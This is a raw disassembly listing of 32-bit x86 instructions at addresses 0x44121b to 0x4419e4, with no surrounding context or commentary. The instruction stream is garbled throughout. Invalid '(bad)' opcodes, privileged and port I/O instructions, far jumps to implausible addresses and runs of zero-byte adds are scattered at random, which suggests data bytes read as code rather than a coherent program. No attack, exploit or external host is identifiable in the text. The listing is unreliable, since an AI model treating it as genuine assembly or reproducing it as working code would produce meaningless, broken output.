  44121b:	sub    edx,DWORD PTR [edx+ecx*2+0x42a22bc9]
  441222:	scas   eax,DWORD PTR es:[edi]
  441223:	sub    eax,ecx
  441225:	cmp    dh,BYTE PTR [ebx+0x2b]
  441228:	add    BYTE PTR [ebp+0x69],dh
  44122b:	mov    esp,0xfcaceafd
  441230:	push   DWORD PTR [ebp+0x6a]
  441233:	sub    al,0xb
  441235:	add    BYTE PTR [eax],al
  441237:	add    BYTE PTR [eax],al
  441239:	add    BYTE PTR [ebp-0x7a19d3cb],ah
  44123f:	mov    edx,0x1f85fc2c
  441244:	sub    eax,0x2d4e843f
  441249:	ja     0x4411cf
  44124b:	jmp    0x80a8bf7d
  441250:	sub    eax,0x2e3464cf
  441255:	jnp    0x4412be
  441257:	imul   DWORD PTR [esi]
  441259:	and    al,0x66
  44125b:	js     0x44128c
  44125d:	pop    ebp
  44125e:	inc    esi
  44125f:	add    cl,BYTE PTR [ebp-0x61f0fad0]
  441265:	xor    dh,dh
  441267:	push   cs
  441268:	pop    esi
  441269:	xor    bh,ah
  44126b:	push   cs
  44126c:	imul   esi,DWORD PTR [eax],0x10
  44126f:	push   ss
  441270:	dec    ebp
  441271:	xor    BYTE PTR [eax],ch
  441273:	push   ss
  441274:	sbb    BYTE PTR [eax],dh
  441276:	inc    ebx
  441277:	push   ss
  441278:	cli    
  441279:	das    
  44127a:	jo     0x44128a
  44127c:	shl    DWORD PTR [edi],1
  44127e:	fwait
  44127f:	push   cs
  441280:	adc    dh,BYTE PTR [eax]
  441282:	xchg   BYTE PTR [esi],cl
  441284:	and    eax,0x350eba30
  441289:	xor    BYTE PTR [ebp-0x50cfb0f2],bl
  44128f:	push   cs
  441290:	xor    DWORD PTR [eax],0xffffffeb
  441293:	push   cs
  441294:	mov    al,0x30
  441296:	inc    ecx
  441297:	bswap  esi
  441299:	xor    BYTE PTR [edi+ecx*1-0x7],dl
  44129d:	xor    BYTE PTR [eax],al
  44129f:	add    BYTE PTR [eax],al
  4412a1:	add    BYTE PTR [eax],al
  4412a3:	mov    bl,0xf
  4412a5:	rdtsc  
  4412a7:	mov    ecx,DWORD PTR [edi]
  4412a9:	dec    ebp
  4412aa:	xor    DWORD PTR [edi+0x331850f],edi
  4412b0:	adc    BYTE PTR [ecx+0x11105431],bh
  4412b6:	xor    bl,BYTE PTR [eax+0x10]
  4412b9:	fs xor bh,ch
  4412bc:	adc    BYTE PTR [eax],dh
  4412be:	xor    dl,dl
  4412c0:	adc    BYTE PTR [edx-0x46eea1ce],ch
  4412c6:	sub    eax,DWORD PTR [edx+0x1b]
  4412c9:	pop    ebx
  4412ca:	das    
  4412cb:	rcl    BYTE PTR [esi],1
  4412cd:	jmp    0x4412f7
  4412cf:	add    eax,0xb8292818
  4412d4:	pop    ss
  4412d5:	inc    edi
  4412d6:	sub    DWORD PTR [edi+0x6a2a0c17],ebx
  4412dc:	sbb    BYTE PTR [eax],al
  4412de:	stos   BYTE PTR es:[edi],al
  4412df:	dec    esp
  4412e0:	(bad)  
  4412e1:	cmp    DWORD PTR [edi+0x5239d15c],ecx
  4412e7:	pop    edi
  4412e8:	cwde   
  4412e9:	cmp    DWORD PTR ds:0xc839504f,eax
  4412ef:	dec    edi
  4412f0:	push   cs
  4412f1:	cmp    DWORD PTR [edi+0x7938e09f],esi
  4412f7:	lahf   
  4412f8:	jb     0x441332
  4412fa:	dec    ebp
  4412fb:	mov    ds,WORD PTR [eax+0x698e2038]
  441301:	cmp    cl,ch
  441303:	es push edi
  441305:	clc    
  441306:	lods   eax,DWORD PTR ds:[esi]
  441307:	add    BYTE PTR [eax],al
  441309:	add    BYTE PTR [eax],al
  44130b:	add    BYTE PTR [esi+0x2],dh
  44130e:	add    dh,ah
  441310:	xchg   ah,dh
  441312:	das    
  441313:	push   ds
  441314:	sbb    DWORD PTR ds:0x84695330,0x7766642f
  44131e:	das    
  44131f:	jge    0x441387
  441321:	inc    ecx
  441322:	das    
  441323:	leave  
  441324:	data16 fs das 
  441327:	jmp    0xc8730875
  44132c:	inc    ecx
  44132d:	sbb    ch,BYTE PTR [edi]
  44132f:	fisttp WORD PTR [ecx-0x4c]
  441332:	or     DWORD PTR cs:[eax-0x2d],eax
  441336:	cs or  al,0xa8
  441339:	jne    0x441369
  44133b:	mov    ax,ds:0xa93d2e94
  441341:	xor    eax,0x51a18b2e
  441346:	outs   dx,BYTE PTR cs:[esi]
  441348:	mov    DWORD PTR [ebx],ebp
  44134a:	cs es or ecx,0x2d
  44134f:	(bad)  
  441350:	mov    ch,dl
  441352:	sub    eax,0x2d888065
  441357:	fwait
  441358:	push   0x8e002d98
  44135d:	pmulhuw mm6,QWORD PTR [edx]
  441360:	movhps xmm6,QWORD PTR ss:[ebx]
  441364:	scas   al,BYTE PTR es:[edi]
  441365:	lfs    esi,FWORD PTR [ebx]
  441368:	jo     0x44137a
  44136a:	shl    DWORD PTR [ebx],cl
  44136c:	test   DWORD PTR [eax],ebp
  44136e:	sysenter 
  441370:	add    BYTE PTR [eax],al
  441372:	add    BYTE PTR [eax],al
  441374:	add    BYTE PTR [ebp-0x35cbbfd8],dl
  44137a:	sub    BYTE PTR [esp+esi*1+0x28],cl
  44137e:	sub    BYTE PTR [esp+esi*1-0x12],ah
  441382:	daa    
  441383:	jp     0x4413b9
  441385:	shl    DWORD PTR [edi],1
  441387:	xchg   ecx,eax
  441388:	xor    al,0x76
  44138a:	daa    
  44138b:	sub    BYTE PTR ds:0x35631300,dh
  441391:	cli    
  441392:	daa    
  441393:	mov    eax,0xf5280135
  441398:	xor    eax,0x361b1253
  44139d:	ins    BYTE PTR es:[edi],dx
  44139e:	adc    al,0x76
  4413a0:	ss cld 
  4413a2:	adc    al,0xdf
  4413a4:	adc    BYTE PTR ss:[ecx],0x5a
  4413a8:	aaa    
  4413a9:	jmp    0x7bcabf
  4413ae:	adc    al,BYTE PTR [edi]
  4413b0:	cmp    BYTE PTR [ebp-0x74c76fda],bl
  4413b6:	fdivr  QWORD PTR es:[eax]
  4413b9:	fisub  WORD PTR [esi]
  4413bb:	add    BYTE PTR [ecx],bh
  4413bd:	add    ch,BYTE PTR [esi+edx*1]
  4413c0:	cmp    bh,BYTE PTR [eax+ebp*1-0xe]
  4413c4:	cmp    al,0x99
  4413c6:	sub    al,0x83
  4413c8:	ds xor eax,0xb13eef2c
  4413ce:	sub    bh,BYTE PTR [edx+0x3f]
  4413d1:	fsub   QWORD PTR [ebx-0x6]
  4413d4:	push   esp
  4413d6:	(bad)  
  4413d7:	(bad)  
  4413d8:	inc    DWORD PTR [eax]
  4413da:	add    BYTE PTR [eax],al
  4413dc:	add    BYTE PTR [eax],al
  4413de:	jne    0x44144a
  4413e0:	sub    eax,0x2d9f640e
  4413e5:	pop    ebp
  4413e6:	fs sub eax,0x2164b72d
  4413ec:	sub    eax,0x320364ec
  4413f1:	das    
  4413f2:	inc    edi
  4413f3:	mov    ds:0x72474d32,eax
  4413f8:	xor    dh,BYTE PTR [eax+0x47]
  4413fb:	sub    dh,BYTE PTR [edx]
  4413fd:	rol    DWORD PTR [edi+0xf],0x32
  441401:	in     al,0xa7
  441403:	sti    
  441404:	xor    ecx,esi
  441406:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441407:	ins    BYTE PTR es:[edi],dx
  441408:	xor    ecx,DWORD PTR [esi]
  44140a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44140b:	dec    edx
  44140c:	xor    ebx,DWORD PTR [ecx-0x5a]
  44140f:	aam    0x33
  441411:	add    ecx,DWORD PTR [ecx-0x7eead7c6]
  441417:	or     BYTE PTR [eax],dh
  441419:	xor    DWORD PTR [ecx-0x7ec0d00b],ecx
  44141f:	daa    
  441420:	xor    BYTE PTR [ebp+0x69],al
  441423:	sbb    DWORD PTR [eax],esi
  441425:	push   ebx
  441426:	popa   
  441427:	and    esi,DWORD PTR [eax]
  441429:	pop    ecx
  44142a:	imul   eax,eax,0x861af2f
  441430:	sub    DWORD PTR [eax+ecx*2],ebp
  441433:	pop    edx
  441434:	sub    DWORD PTR [eax],edi
  441436:	inc    eax
  441437:	mov    ebp,DWORD PTR [ecx]
  441439:	adc    cl,BYTE PTR [ebx+0x4b]
  44143c:	cs dec edi
  44143e:	inc    ebx
  44143f:	pop    ss
  441440:	cs je  0x441443
  441443:	add    BYTE PTR [eax],al
  441445:	add    BYTE PTR [eax],al
  441447:	stos   DWORD PTR es:[edi],eax
  441448:	shr    DWORD PTR [esi],1
  44144a:	les    esp,FWORD PTR [ebx-0x540fd162]
  441450:	ss das 
  441452:	js     0x4413f6
  441454:	adc    DWORD PTR [eax],esi
  441456:	out    0x8a,eax
  441458:	das    
  441459:	and    al,0x77
  44145b:	lea    eax,[edx]
  44145d:	sub    DWORD PTR [ebx],0x2aed19bb
  441463:	jns    0x44147e
  441465:	jne    0x441491
  441467:	leave  
  441468:	sbb    BYTE PTR [edx+0x5b15f42c],bl
  44146e:	es push eax
  441470:	sbb    BYTE PTR [eax+0x29],dl
  441473:	aam    0x16
  441475:	out    0xf3,eax
  441477:	nop
  441478:	push   esi
  441479:	call   0x1033:0xc2027503
  441480:	adc    al,BYTE PTR [edi+0x33]
  441483:	retf   0x5d11
  441486:	xor    ah,BYTE PTR [edx]
  441488:	adc    al,0xf0
  44148a:	xor    al,0x97
  44148c:	adc    DWORD PTR [ecx+0xc0d4b2f],edx
  441492:	xor    DWORD PTR [eax+0x2b2b4d1a],edx
  441498:	sbb    eax,edi
  44149a:	sub    cl,bh
  44149c:	sbb    ebp,DWORD PTR [edi+0x2d]
  44149f:	out    0x1b,al
  4414a1:	mov    BYTE PTR ds:0x2da71c09,ch
  4414a7:	pop    ecx
  4414a8:	sbb    BYTE PTR [eax],dh
  4414aa:	sub    al,BYTE PTR [eax]
  4414ac:	add    BYTE PTR [eax],al
  4414ae:	add    BYTE PTR [eax],al
  4414b0:	xchg   edi,eax
  4414b1:	sbb    BYTE PTR [ebx+0x2a],al
  4414b4:	ficomp WORD PTR [ecx]
  4414b6:	stos   DWORD PTR es:[edi],eax
  4414b7:	sub    ebp,DWORD PTR [eax+0x16]
  4414ba:	xchg   edx,eax
  4414bb:	sub    BYTE PTR [esi],bh
  4414bd:	sbb    BYTE PTR [ebx],dl
  4414bf:	es dec eax
  4414c1:	adc    eax,0x275276a
  4414c6:	out    0x83,eax
  4414c8:	clc    
  4414c9:	push   ebp
  4414ca:	inc    esi
  4414cb:	add    al,0x75
  4414cd:	add    dh,BYTE PTR [esi]
  4414cf:	xor    al,0x42
  4414d1:	adc    cl,BYTE PTR [ebx]
  4414d3:	xor    al,0x5b
  4414d5:	adc    bl,BYTE PTR [ebp+0x34]
  4414d8:	adc    eax,0x89420013
  4414dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4414de:	das    
  4414df:	popf   
  4414e0:	add    DWORD PTR [edi+ebp*1+0x53],0xe72f5289
  4414e8:	add    DWORD PTR [esi],0x9d68692f
  4414ee:	cs push ecx
  4414f0:	pusha  
  4414f1:	in     al,dx
  4414f2:	sub    eax,0x2d7464b7
  4414f7:	in     al,dx
  4414f8:	sbb    BYTE PTR [di],ch
  4414fb:	stos   DWORD PTR es:[edi],eax
  4414fc:	inc    edi
  4414fd:	shr    BYTE PTR [ebx+eiz*4],0x47
  441501:	enter  0xbb2c,0x47
  441505:	mov    al,0x2c
  441507:	ret    
  441508:	inc    edi
  441509:	mov    eax,0xe0a78b2c
  44150e:	sub    al,0x83
  441510:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441511:	call   0x449042
  441516:	add    BYTE PTR [eax],al
  441518:	add    BYTE PTR [edi-0x587cd330],ah
  44151e:	cmp    eax,0x8586072c
  441523:	xor    bh,dl
  441525:	test   esi,eax
  441527:	xor    DWORD PTR [edx-0x6d],edx
  44152a:	shl    DWORD PTR [ecx],cl
  44152c:	stos   BYTE PTR es:[edi],al
  44152d:	mov    BYTE PTR [ecx+0x31],cl
  441530:	fisub  WORD PTR [eax+0x54]
  441533:	xor    ecx,edi
  441535:	pop    ebx
  441536:	and    DWORD PTR [ecx],esi
  441538:	push   edi
  441539:	push   edx
  44153a:	iret   
  44153b:	xor    BYTE PTR [ebx+ecx*2+0x5ed23039],ch
  441542:	xchg   DWORD PTR [esi],esi
  441544:	mov    ebx,DWORD PTR [ecx-0x64]
  441547:	ss gs push ecx
  44154a:	dec    edx
  44154b:	ss scas al,BYTE PTR es:[edi]
  44154d:	dec    ecx
  44154e:	pop    edi
  44154f:	xor    eax,0x34bb9fd9
  441554:	sub    DWORD PTR [ebp+0x77003bc1],ebx
  44155a:	sub    al,BYTE PTR [eax-0x5d5d9c4]
  441560:	cmp    eax,0x3e391f08
  441565:	mov    ds:0x123f381b,eax
  44156a:	sbb    al,0x0
  44156c:	add    ah,cl
  44156e:	jo     0x44156a
  441570:	inc    eax
  441572:	add    BYTE PTR [eax],al
  441574:	add    BYTE PTR [edx+0x5831c00d],dh
  44157a:	push   cs
  44157b:	add    dh,BYTE PTR [edx]
  44157d:	add    BYTE PTR [eax],al
  44157f:	add    BYTE PTR [eax],al
  441581:	add    ah,bh
  441583:	adc    al,BYTE PTR [ebx+esi*1]
  441586:	sub    BYTE PTR [eax],dl
  441588:	mov    bl,0x33
  44158a:	or     BYTE PTR ds:0x11d3350f,ah
  441590:	hlt    
  441591:	xor    eax,0x37022682
  441596:	cmp    BYTE PTR ds:0x266b375a,ah
  44159c:	std    
  44159d:	aaa    
  44159e:	data16 sub BYTE PTR [edi+0x12277538],cl
  4415a5:	cmp    DWORD PTR [ebx],ecx
  4415a7:	sub    DWORD PTR [ebp+0x3b],ebp
  4415aa:	shr    BYTE PTR [eax],cl
  4415ac:	lahf   
  4415ad:	cmp    edx,DWORD PTR [edi]
  4415af:	sub    dl,al
  4415b1:	cmp    ebp,DWORD PTR [edx+ebp*1]
  4415b4:	cmp    BYTE PTR [eax+edi*4],bh
  4415b7:	sub    bl,BYTE PTR [ebx-0x4dd554c4]
  4415bd:	cmp    al,0x0
  4415bf:	sub    ebx,ebx
  4415c1:	cmp    al,0x8
  4415c3:	sbb    eax,0x1bfb3d6d
  4415c8:	int    0x3d
  4415ca:	sub    ebx,DWORD PTR [esi]
  4415cc:	jge    0x44160c
  4415ce:	cwde   
  4415cf:	sbb    al,0x12
  4415d1:	aas    
  4415d2:	push   ss
  4415d3:	pop    ds
  4415d4:	cmp    DWORD PTR [edi],0xfd9c6975
  4415da:	jmp    0x33e9:0x750003b5
  4415e1:	fwait
  4415e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4415e3:	mov    ds:0x342c,al
  4415e8:	add    BYTE PTR [eax],al
  4415ea:	add    BYTE PTR [edi-0x79d3d248],al
  4415f0:	dec    edi
  4415f1:	sub    BYTE PTR [esi-0x44d71177],bh
  4415f7:	sub    BYTE PTR [eax+ebp*1+0x2a1c6b7b],0xfe
  4415ff:	arpl   dx,di
  441601:	sub    ah,BYTE PTR [ecx+0x6a]
  441604:	mov    bl,0x2a
  441606:	sub    eax,0x424435d
  44160b:	dec    esp
  44160c:	push   edx
  44160d:	and    eax,0x24af4c49
  441612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441613:	cmp    al,0x18
  441615:	and    eax,0x25083cdc
  44161a:	out    0xac,eax
  44161c:	lock and al,0xfe
  44161f:	lods   al,BYTE PTR ds:[esi]
  441620:	pop    edi
  441621:	adc    BYTE PTR es:[edi-0x60ccd9b8],bl
  441628:	into   
  441629:	es stos DWORD PTR es:[edi],eax
  44162b:	(bad)
  44162f:	(bad)
  441633:	jle    0x4415c1
  441635:	daa    
  441636:	sar    DWORD PTR [esi+0x67],cl
  441639:	and    BYTE PTR [edi],cl
  44163b:	jno    0x441656
  44163d:	sub    BYTE PTR [edi+0x69],bh
  441640:	jge    0x441662
  441642:	(bad)  
  441643:	popa   
  441644:	ja     0x441666
  441646:	xlat   BYTE PTR ds:[ebx]
  441647:	pop    ecx
  441648:	je     0x44166a
  44164a:	out    dx,eax
  44164b:	push   ecx
  44164c:	xchg   ecx,eax
  44164d:	and    BYTE PTR [eax],al
  44164f:	add    BYTE PTR [eax],al
  441651:	add    BYTE PTR [eax],al
  441653:	add    BYTE PTR [eax+0x45],cl
  441656:	and    DWORD PTR ds:0x271e0240,esp
  44165c:	jmp    0x441672
  44165e:	pop    ecx
  44165f:	es jl  0x441676
  441662:	jmp    0x2724:0x6d133c24
  441669:	adc    eax,DWORD PTR [edx-0x18fd8adc]
  44166f:	mov    bl,0xd0
  441671:	push   edx
  441672:	loop   0x441675
  441674:	jne    0x441678
  441676:	loop   0x4416ab
  441678:	adc    DWORD PTR [bx],ecx
  44167b:	xor    esi,DWORD PTR [eax]
  44167d:	adc    ebp,ecx
  44167f:	xor    dh,ch
  441681:	adc    BYTE PTR [edx+0x32],dh
  441684:	aam    0x10
  441686:	jl     0x4416ba
  441688:	jecxz  0x44169a
  44168a:	stos   BYTE PTR es:[edi],al
  44168b:	xor    DWORD PTR [esi],esp
  44168d:	adc    BYTE PTR [ecx+0x31],ch
  441690:	sbb    BYTE PTR [edi],cl
  441692:	xor    BYTE PTR fs:[edx+0xe],bl
  441696:	mov    edx,0xf90db02f
  44169b:	cs push esp
  44169d:	or     eax,0x181a2ecc
  4416a2:	push   edi
  4416a3:	xor    DWORD PTR cs:[eax],ebx
  4416a6:	sbb    eax,0x7418872e
  4416ab:	sub    eax,0x2d411907
  4416b0:	push   ds
  4416b1:	sbb    DWORD PTR [edi],eax
  4416b3:	sub    eax,0x2ced1957
  4416b8:	add    BYTE PTR [eax],al
  4416ba:	add    BYTE PTR [eax],al
  4416bc:	add    BYTE PTR [ebx+0x19],ch
  4416bf:	adc    ebx,DWORD PTR [ebx]
  4416c1:	sbb    DWORD PTR [ecx],0x22
  4416c4:	sbb    edx,ebx
  4416c6:	sbb    DWORD PTR [edx+0x1b],eax
  4416c9:	push   es
  4416ca:	sbb    cl,BYTE PTR [ecx-0x2ce5bfe5]
  4416d0:	sbb    ecx,DWORD PTR [eax]
  4416d2:	sbb    bh,BYTE PTR [ebx+ebx*1-0x2efff589]
  4416d9:	outs   dx,BYTE PTR ds:[esi]
  4416da:	les    esi,FWORD PTR [edi]
  4416dc:	or     al,0x61
  4416de:	into   
  4416df:	aaa    
  4416e0:	js     0x44173b
  4416e2:	je     0x44171b
  4416e4:	dec    esi
  4416e5:	xchg   ecx,eax
  4416e6:	das    
  4416e7:	aaa    
  4416e8:	jmp    0x167ac876
  4416ed:	add    BYTE PTR [ecx+0x44783e36],0x36
  4416f4:	scas   eax,DWORD PTR es:[edi]
  4416f5:	jo     0x4416f0
  4416f7:	xor    eax,0x35ce68bd
  4416fc:	arpl   WORD PTR [bx+si+0x7835],cx
  441701:	pop    ebx
  441702:	jae    0x441739
  441704:	adc    BYTE PTR [ebx-0x7473ca5e],0xa8
  44170b:	xor    eax,0x3596837e
  441710:	cmp    BYTE PTR [ebx-0x74],0x35
  441714:	sub    dh,BYTE PTR [ebx+0x3a]
  441717:	xor    eax,0x35406b24
  44171c:	push   ss
  44171d:	arpl   WORD PTR [esi],bp
  44171f:	xor    eax,0x8
  441724:	add    BYTE PTR [eax],al
  441726:	pop    ebx
  441727:	fs xor eax,0x35529312
  44172d:	sbb    al,0x8b
  44172f:	pop    eax
  441730:	xor    eax,0x3506830e
  441735:	lock jnp 0x441734
  441738:	xor    al,0xda
  44173a:	jae    0x441726
  44173c:	xor    al,0xd4
  44173e:	imul   esi,eax,0x34
  441741:	(bad)  
  441742:	arpl   WORD PTR [esi],bx
  441744:	xor    eax,0x35145a18
  441749:	and    dl,BYTE PTR [edx-0x75d3cb3e]
  44174f:	enter  0x1e34,0x82
  441753:	mov    dh,0x34
  441755:	add    BYTE PTR [ebp-0xf],dl
  441758:	push   ebp
  441759:	cmp    edi,DWORD PTR [edi-0x4ec4980f]
  44175f:	icebp  
  441760:	imul   edi,DWORD PTR [ebx],0x3b7bf14b
  441766:	(bad)  
  441767:	lock jge 0x4417a5
  44176a:	addr16 lock (bad) 
  44176d:	cmp    ebp,DWORD PTR [ecx-0x10]
  441770:	xchg   ecx,eax
  441771:	cmp    edx,DWORD PTR [ebx-0x10]
  441774:	mov    ds:0xa5f0453b,eax
  441779:	cmp    ecx,DWORD PTR [edi-0x7ec44810]
  44177f:	lock mov ecx,0xcbf01b3b
  441785:	cmp    edi,DWORD PTR [ebp-0x10]
  441788:	int    0x3b
  44178a:	add    BYTE PTR [eax],al
  44178c:	add    BYTE PTR [eax],al
  44178e:	add    BYTE PTR [edi],dh
  441790:	lock fistp QWORD PTR [ebx]
  441793:	cmp    eax,esi
  441795:	loope  0x4417d2
  441797:	arpl   ax,si
  441799:	repz cmp esi,DWORD PTR ds:0x9f3bf5f0
  4417a0:	lock pop es
  4417a2:	cmp    al,0x91
  4417a4:	lock or DWORD PTR [ebx+ebp*4],edi
  4417a8:	lock sbb edi,DWORD PTR [ebp*4+0x473c1df0]
  4417b0:	lock das 
  4417b2:	cmp    al,0x49
  4417b4:	lock xor DWORD PTR [ebx+esi*1],edi
  4417b8:	lock inc ebx
  4417ba:	cmp    al,0x25
  4417bc:	lock inc ebp
  4417be:	cmp    al,0xef
  4417c0:	out    dx,eax
  4417c1:	push   edi
  4417c2:	cmp    al,0xe1
  4417c4:	out    dx,eax
  4417c5:	pop    ecx
  4417c6:	cmp    al,0xfb
  4417c8:	out    dx,eax
  4417c9:	imul   edi,DWORD PTR [ebx*4-0x68c391de],0x22
  4417d1:	cmp    BYTE PTR [esi*2+0x61861fde],0xb0
  4417d9:	pop    ds
  4417da:	xchg   esp,eax
  4417db:	pop    ecx
  4417dc:	loop   0x4417fd
  4417de:	call   0x8649:0xa81f7c51
  4417e5:	pop    ds
  4417e6:	scas   al,BYTE PTR es:[edi]
  4417e7:	inc    ecx
  4417e8:	fcomp  DWORD PTR [edi]
  4417ea:	mov    esp,0xc81f9a39
  4417ef:	mov    cl,0x9e
  4417f1:	pop    ds
  4417f2:	aad    0x0
  4417f4:	add    BYTE PTR [eax],al
  4417f6:	add    BYTE PTR [eax],al
  4417f8:	test   eax,0xa1e81f79
  4417fd:	iret   
  4417fe:	pop    ds
  4417ff:	repz cdq 
  441801:	test   BYTE PTR [edi],bl
  441803:	(bad)  
  441804:	xchg   ecx,eax
  441805:	push   ecx
  441806:	sbb    DWORD PTR [ecx],ecx
  441808:	mov    BYTE PTR [esi],ch
  44180a:	sbb    DWORD PTR [edx],ebx
  44180c:	cmp    BYTE PTR [ecx+ebx*1],0x34
  441810:	js     0x441837
  441812:	sbb    DWORD PTR [esi],edi
  441814:	jo     0x4417a7
  441816:	sbb    DWORD PTR [edx+0x68],ecx
  441819:	inc    edi
  44181a:	sbb    DWORD PTR [eax-0x36e6dea0],esp
  441820:	pop    eax
  441821:	and    bl,BYTE PTR [ecx]
  441823:	out    0x50,al
  441825:	push   ss
  441826:	sbb    DWORD PTR [eax],eax
  441828:	dec    ebx
  441829:	arpl   WORD PTR [esi],bx
  44182b:	adc    al,0x43
  44182d:	pop    es
  44182e:	push   ds
  44182f:	cmp    esp,DWORD PTR cs:[ebp+0x1e]
  441833:	inc    esi
  441834:	mov    bl,0x43
  441836:	push   ds
  441837:	arpl   WORD PTR [ebx-0x5c89e17a],bp
  44183d:	in     eax,0x1d
  44183f:	mov    ds,WORD PTR [ebx-0x6c50e21f]
  441845:	rcr    DWORD PTR ds:0x1e218bbf,0xcb
  44184c:	xor    esi,0x1d
  44184f:	fnstcw WORD PTR [ebx+0x2]
  441852:	shl    BYTE PTR [ecx],1
  441854:	xor    DWORD PTR [eax],edx
  441856:	lock and BYTE PTR [edi+ecx*1-0x4],bh
  44185b:	and    BYTE PTR [eax],al
  44185d:	add    BYTE PTR [eax],al
  44185f:	add    BYTE PTR [eax],al
  441861:	mov    BYTE PTR [edi],cl
  441863:	add    BYTE PTR [ecx],ah
  441865:	dec    ebx
  441866:	verr   WORD PTR [ecx]
  441869:	dec    esp
  44186a:	nop/reserved BYTE PTR [ecx]
  44186d:	lods   eax,DWORD PTR ds:[esi]
  44186e:	cmova  esp,DWORD PTR [ecx]
  441871:	xchg   edi,eax
  441872:	(bad)  
  441874:	and    DWORD PTR [edi+0x7021240f],eax
  44187a:	pcmpeqb mm4,QWORD PTR [eax]
  44187d:	or     DWORD PTR [edi],ecx
  44187f:	dec    ebx
  441880:	and    BYTE PTR [ebx],bl
  441882:	cmovg  esp,DWORD PTR [eax]
  441885:	mov    ch,0xe
  441887:	stos   BYTE PTR es:[edi],al
  441888:	and    BYTE PTR [esi-0x2edf66f2],bh
  44188e:	push   cs
  44188f:	and    DWORD PTR [eax],0xffffffd3
  441892:	push   cs
  441893:	outs   dx,BYTE PTR ds:[esi]
  441894:	and    BYTE PTR [ebp+0x2],dh
  441897:	out    0x43,eax
  441899:	mov    al,0x4e
  44189b:	jmp    0x7813:0xeb027502
  4418a2:	adc    ch,ch
  4418a4:	adc    edi,DWORD PTR [ebx+0x12]
  4418a7:	adc    BYTE PTR [esp+ebx*2],dl
  4418aa:	adc    ch,BYTE PTR [ecx-0x6cedd9ed]
  4418b0:	adc    esp,DWORD PTR [ebx]
  4418b2:	adc    bh,BYTE PTR [ebp-0x63edf5ed]
  4418b8:	adc    ebp,eax
  4418ba:	adc    ch,BYTE PTR [eax+0x13]
  4418bd:	repnz adc dh,BYTE PTR [edx+0x13]
  4418c1:	dec    eax
  4418c2:	adc    eax,DWORD PTR ds:0x13
  4418c8:	add    BYTE PTR [eax],al
  4418ca:	push   edx
  4418cb:	adc    edx,DWORD PTR [edx]
  4418cd:	adc    eax,DWORD PTR [ebx+edx*1-0x7]
  4418d1:	adc    cl,BYTE PTR [ebx+0x13]
  4418d4:	add    cl,ah
  4418d6:	addr16 clc 
  4418d8:	xlat   BYTE PTR cs:[ebx]
  4418da:	sbb    ebp,DWORD PTR [bx]
  4418dd:	inc    eax
  4418de:	mov    ah,bl
  4418e0:	test   DWORD PTR cs:[eax-0x7b07d1a9],eax
  4418e7:	es cs jne 0x441872
  4418eb:	bound  ebp,QWORD PTR ds:0x2cf167c1
  4418f1:	and    ah,BYTE PTR [esi-0x80]
  4418f4:	xor    cl,dh
  4418f6:	pop    esp
  4418f7:	push   ebx
  4418f8:	xor    ch,BYTE PTR [esp+ebx*2-0x74cfcdd9]
  4418ff:	fbstp  TBYTE PTR [ecx]
  441901:	ja     0x441886
  441903:	imul   esi,DWORD PTR [ecx],0x31678ba9
  441909:	call   0xb9750491
  44190e:	imul   esi,DWORD PTR [eax+0x3063ff30],0x30
  441915:	mov    ebx,0x1c380a5e
  44191a:	pop    ecx
  44191b:	mov    ah,0x37
  44191d:	(bad)  
  44191e:	mov    es,WORD PTR [eax-0x617682c9]
  441924:	aaa    
  441925:	sub    al,BYTE PTR [ecx+0x79583735]
  44192b:	jmp    0x0:0xff36
  441932:	add    BYTE PTR [ecx-0x50],dh
  441935:	ss into 
  441937:	imul   ecx,DWORD PTR [ebx],0xab5caf36
  44193d:	xor    eax,0x356f5f55
  441942:	pop    DWORD PTR [bp+di]
  441945:	xor    eax,0x34688fee
  44194a:	pop    ebp
  44194b:	jle    0x44198b
  44194d:	xor    al,0x2d
  44194f:	jle    0x4419af
  441951:	xor    al,0x0
  441953:	pop    esi
  441954:	in     eax,dx
  441955:	or     eax,0x2ded323c
  44195a:	cmp    al,0xe6
  44195c:	in     al,dx
  44195d:	jae    0x44199b
  44195f:	mov    eax,ds:0xe23ca522
  441964:	in     al,dx
  441965:	fnstsw WORD PTR [ebx+ecx*2]
  441968:	in     eax,dx
  441969:	cld    
  44196a:	cmp    al,0x17
  44196c:	and    cl,BYTE PTR [ecx]
  44196e:	cmp    eax,0x3d4f2374
  441973:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441974:	and    ebp,DWORD PTR [edx+0x3d]
  441977:	xchg   BYTE PTR [edx],ah
  441979:	mov    edi,DWORD PTR ds:0x3dc321f5
  44197f:	in     eax,0x21
  441981:	out    0x3d,eax
  441983:	in     eax,dx
  441984:	out    dx,al
  441985:	push   ss
  441986:	ds shr esi,0x4e
  44198a:	ds jno 0x441979
  44198d:	jb     0x4419cd
  44198f:	dec    ecx
  441990:	out    dx,eax
  441991:	mov    ds:0xddef1d3e,al
  441996:	add    BYTE PTR ds:[eax],al
  441999:	add    BYTE PTR [eax],al
  44199b:	add    BYTE PTR [eax-0x11],al
  44199e:	add    DWORD PTR [edi],edi
  4419a0:	mov    ebx,0x5f3f34eb
  4419a5:	in     eax,dx
  4419a6:	ins    BYTE PTR es:[edi],dx
  4419a7:	aas    
  4419a8:	pop    ds
  4419a9:	in     al,dx
  4419aa:	nop
  4419ab:	aas    
  4419ac:	xlat   BYTE PTR ds:[ebx]
  4419ad:	jmp    0x44196f
  4419af:	aas    
  4419b0:	imul   ebp,esp,0xffffffff
  4419b3:	dec    DWORD PTR [eax+edx*1+0x16cfffb]
  4419ba:	add    BYTE PTR [eax],al
  4419bc:	nop
  4419bd:	lock or DWORD PTR [eax],esi
  4419c0:	je     0x4419b8
  4419c2:	inc    esp
  4419c3:	xor    ah,ah
  4419c5:	lock push esi
  4419c7:	xor    BYTE PTR [edx],al
  4419c9:	lock xor BYTE PTR fs:[eax],al
  4419cd:	lock jb 0x441a00
  4419d0:	jne    0x4419a9
  4419d2:	or     al,0x8b
  4419d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4419d5:	iret   
  4419d6:	or     al,0xd2
  4419d8:	test   esp,edi
  4419da:	or     al,0x1d
  4419dc:	test   BYTE PTR [ebp-0x247b8ced],dl
  4419e2:	adc    eax,ecx
  4419e4:	test   BYTE PTR [ebx+0xc],cl
